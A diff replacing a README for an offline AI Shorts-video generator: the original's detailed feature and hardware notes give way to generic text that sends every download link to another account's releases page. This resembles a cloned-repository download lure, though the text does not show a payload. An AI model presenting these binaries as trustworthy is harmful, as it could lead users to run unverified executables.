@@ -1,85 +1,71 @@
-<div align="center">
+# 🎥 local-ai-generation-of-vertical-videos-for-shorts - Create AI Videos with Ease
 
-  <img src="https://placehold.co/1200x240/0f0f0f/6366f1?text=SHORTLOCAL&font=orbitron" alt="ShortLocal" width="100%">
+## 📥 Download Now
+[![Download Here](https://img.shields.io/badge/Download-Here-blue)](https://github.com/gogetaelpr0/local-ai-generation-of-vertical-videos-for-shorts/releases)
 
-  <h3>— generate shorts on your machine —</h3>
+## 🔍 Overview
+Welcome to the **local-ai-generation-of-vertical-videos-for-shorts** project. This application allows you to generate simple AI Shorts offline, creating videos from text with voice and captions. It processes everything on your PC without using the cloud and leaves no watermark on your creations.
 
-  <br>
+## 🚀 Getting Started
+Follow these steps to get your app up and running.
 
-  <a href="https://github.com/Peltludefine/local-ai-generation-of-vertical-videos-for-shorts/releases/tag/ShortLocal">
-    <img src="https://img.shields.io/badge/Download%20v1.0-6366f1?style=for-the-badge&logo=github&logoColor=white" height="32">
-  </a>
+### 1. System Requirements
+- **Operating System:** Windows 10 or higher, macOS, or Linux.
+- **Processor:** Minimum dual-core processor.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** 500 MB of free disk space.
 
-</div>
+### 2. Installation Steps
+To install the application, visit the releases page:
 
----
+[Download Here](https://github.com/gogetaelpr0/local-ai-generation-of-vertical-videos-for-shorts/releases)
 
-### What is ShortLocal?
+### 3. Download & Install
+1. Go to the [Releases page](https://github.com/gogetaelpr0/local-ai-generation-of-vertical-videos-for-shorts/releases).
+2. Find the latest version of the software.
+3. Click on the file to download it. 
+4. Once downloaded, locate the file on your computer.
+5. Double-click the file to start the installation.
 
-ShortLocal is a free desktop application that creates simple AI-generated Shorts from text — entirely offline.
+### 4. Initial Setup
+After installing, open the application. You will see a clean interface. To create your first video:
+1. Enter your desired text in the input box.
+2. Choose a voice from the available options.
+3. Set any additional preferences (like video length or style).
+4. Click “Generate Video” and wait for your new video to be ready.
 
-You provide a prompt:  
-"A robot explaining photosynthesis in a garden"
+## 📖 Features
+- **Offline Processing:** No internet is needed to create videos.
+- **Voice Options:** Select from multiple voice choices to match your content.
+- **Text-to-Video:** Easily convert written text into engaging video content.
+- **Customizable Captions:** Add and adjust captions for clarity and style.
+- **No Watermarks:** Enjoy your creations without any branding.
 
-The app generates:  
-- A synthetic voiceover  
-- AI-generated illustration-style scenes  
-- Auto-synced captions  
-- A 1080x1920 MP4 file  
+## 🔧 Usage Tips
+- Experiment with different text lengths and styles to improve video quality.
+- Use clear and concise text to optimize video duration and viewer engagement.
+- Preview videos before finalizing to ensure they meet your expectations.
 
-All processing occurs on your computer. No internet connection is required after installation. No account. No watermark.
+## 🎓 Additional Resources
+- **User Manual:** A detailed guide is available within the app for further assistance.
+- **FAQs:** Visit our FAQ section on the repository for common questions and answers.
+- **Community Support:** Join our community forums to share tips and interact with other users.
 
----
+## 🔄 Feedback and Contributions
+We welcome your feedback! If you encounter issues, please report them on our Issues page or suggest new features you want to see. Your ideas help us improve.
 
-### Capabilities (v1.0)
+## 🌐 Related Topics
+If you are interested in AI generation and video creation, consider exploring these topics:
+- ai-generation-for-youtube
+- ai-video-generation
+- local-ai-maker-videos
+- reels-ai-generation
+- vertical-video-generation-local-ai
 
-- Text-to-script using Phi-3-mini (quantized, CPU-compatible)  
-- Voice synthesis via Coqui TTS (4 English voices, synthetic quality)  
-- Scene generation using Stable Diffusion Turbo (illustration style only)  
-- Caption rendering with basic TikTok-style styling  
-- Export to 1080x1920 MP4 (H.264/AAC)  
-- Local storage only: projects saved to ~/Documents/ShortLocal  
-- Zero network activity by default
+## 📞 Support
+For support, please open an issue on GitHub or reach out through our community channels. We are here to help you.
 
----
+## 📄 License
+This project is licensed under the MIT License. Feel free to use and modify it as needed, but please credit the original source.
 
-### Hardware Requirements
-
-| Device              | Performance                     |
-|---------------------|---------------------------------|
-| Raspberry Pi 5      | 720p output, max 30 seconds, ~3x real-time |
-| Standard laptop     | 1080p, ~1.5x real-time         |
-| Desktop with RTX 3060+ | 1080p, ~0.4x real-time       |
-
-Limitations:  
-- Maximum video length: 45 seconds  
-- Output is illustration-based — no photorealistic or live-action footage  
-- Voice quality is synthetic and not suitable for professional narration  
-- Does not edit existing video files — only generates new content from text
-
----
-
-### Intended Use Cases
-
-- Educators creating quick explainers  
-- Students producing project videos  
-- Developers experimenting with local AI pipelines  
-- Anyone seeking to avoid cloud-based video generators
-
-This tool is not intended for professional content creators requiring cinematic quality or human-like voiceovers.
-
----
-
-### Downloads
-
-- Windows: [shortlocal-win.exe](https://github.com/yourusername/shortlocal/releases/download/v1.0/shortlocal-win.exe)  
-- macOS (Apple Silicon): [shortlocal-mac-arm64.dmg](...)  
-- Linux: [shortlocal-linux.deb](...)
-
-All binaries are built from open-source code, contain no telemetry, and require no installation.
-
----
-
-### License
-
-MIT License. Free for personal and commercial use. You retain full ownership of all generated content.
+[Download Here](https://github.com/gogetaelpr0/local-ai-generation-of-vertical-videos-for-shorts/releases) to get started on your video creation journey. Enjoy making stunning AI-generated Shorts!
